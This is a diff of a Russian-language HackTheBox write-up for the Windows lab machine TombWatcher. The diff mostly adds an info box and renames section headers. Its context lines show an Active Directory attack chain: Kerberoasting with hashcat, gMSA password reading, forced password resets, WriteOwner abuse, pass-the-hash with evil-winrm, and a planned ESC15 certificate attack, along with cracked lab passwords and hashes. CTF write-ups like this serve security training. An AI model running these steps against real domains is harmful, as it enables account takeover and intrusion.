@@ -1,9 +1,22 @@
+<div class="htb-box-info medium">
+  <div class="box-header">
+    <img src="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/59c74a969b4fec16cd8072d253ca9917.png" alt="Machine Name">
+    <div class="box-details">
+      <h2>Box Info</h2>
+      <table>
+        <tr><td>OS:</td><td>Windows</td></tr>
+        <tr><td>Difficulty:</td><td>Medium</td></tr>
+        <tr><td>Release:</td><td>7 Jun 2025</td></tr>
+      </table>
+    </div>
+  </div>
+</div>
+
 ---
-cover: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/59c74a969b4fec16cd8072d253ca9917.png
-type: windows
-status: SOLVED
-level: "2"
----
+
+# user flag
+### recon
+
 > As is common in real life Windows pentests, you will start the TombWatcher box with credentials for the following account: henry / H3nry_987TGV!
 
 ```bash
@@ -36,6 +49,8 @@ netexec smb 10.129.232.167 -u henry -p 'H3nry_987TGV!' --users
 На веб порту видим обычную windows страницу.
 ![[Pasted image 20260506090937.png]]
 
+### bloodhound analysis
+
 Я также имею доступ к ldap:
 ```bash
 netexec ldap DC01.tombwatcher.htb -u henry -p 'H3nry_987TGV!'
@@ -61,7 +76,7 @@ RustHound-CE Enumeration Completed at 09:10:45 on 05/06/26! Happy Graphing!
 Я нашел такой вот путь до пользователя `john`. Я пойду по нему...
 ![[Pasted image 20260506092241.png]]
 
-### WriteSPN
+### Auth as Alfred
 ![[Pasted image 20260510121850.png]]
 У меня есть права `WriteSPN` над `alfred`. Будем использовать атаку кербероастинг... Kerberoasting нацелена на учетную запись службы, поскольку в ней настроено имя участника службы (SPN), а это значит, что любой аутентифицированный пользователь может запросить TGS для этой учетной записи. Этот TGS шифруется паролем учетной записи службы, и если этот пароль слабый, его можно подобрать методом перебора.
 
@@ -92,7 +107,7 @@ hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
 ```
 Паролем оказалось слово `basketball`. Я попробовал посмотреть к чему этот аккаунт имеет доступ с помощью `netexec`. Ничего нового не нашел...
 
-### AddSelf
+#### AddSelf to INFRASTRUCTURE
 ![[Pasted image 20260510121915.png]]
 `alfred` может добавить себя в группу INFRASTRUCTURE. Использую инструмент `bloodyAD` для этого:
 
@@ -103,7 +118,7 @@ OUTPUT:
 [+] alfred added to INFRASTRUCTURE
 ```
 
-### ReadGMSAPassword
+### Auth as ansible_dev$
 ![[Pasted image 20260510122102.png]]
 > A **Group Managed Service Account (gMSA)** is a domain account used by services (like IIS or SQL). Unlike regular users, Windows automatically manages the password (usually 240 characters long) and rotates it every 30 days. The password is stored in an attribute called msDS-ManagedPassword. By default, you cannot read this. However, the **ReadGMSAPassword** right (technically the msDS-ManagedPasswordRead right) allows members of a specific group to decrypt this attribute and retrieve the password.
 
@@ -124,7 +139,7 @@ ansible_dev$:aes128-cts-hmac-sha1-96:f43746eee24abcf409d2f3c798563bde
 
 Получаем хэш для пользователя `ansible_dev$` - 7e792e4c14e4040a0b4f18235a6afe55.
 
-### ForceChangePassword
+### Auth as sam
 ![[Pasted image 20260510122700.png]]
 
 `ansible_dev$` имеет право на ForceChangePassword пользователю `sam`.
@@ -144,7 +159,7 @@ OUTPUT:
 [+] tombwatcher.htb\sam:Fsociety_1337
 ```
 
-### WriteOwner
+### Auth as john
 ![[Pasted image 20260510123002.png]]
 Наконец `sam` имеет `WriteOwner` над `john`-ом. С помощью `WriteOwner` я могу назначить sam-a владельцем учетной записи john-a. В качестве владельца sam может разрешить ему использовать `genericAll`. После этого sam может либо установить пароль john-a, либо получить `shadowCreds`, либо использовать целевой Kerberoast.
 
@@ -185,6 +200,7 @@ evil-winrm -i DC01.tombwatcher.htb -u john -H ad9324754583e3e42b55aad4d3b8d2bf
 ![[Pasted image 20260506145458.png]]
 
 # root
+### recovering cert_admin
 Я еще раз решил посмотреть в `bloodhound`. Увидел следующее:
 ![[Pasted image 20260510123910.png]]
 Мы имеем `GenericAll` над ADCS. Можем взять полный контроль над этим OU... Пока не понятно только...
@@ -328,6 +344,8 @@ netexec smb 10.129.232.167 -u 'cert_admin' -p 'IamD0newithyou'
 OUTPUT:
  [+] tombwatcher.htb\cert_admin:IamD0newithyou
 ```
+
+### ESC15 
 
 Попробую опять запустить certipy для выявления уязвимых шаблонов:
 ```bash
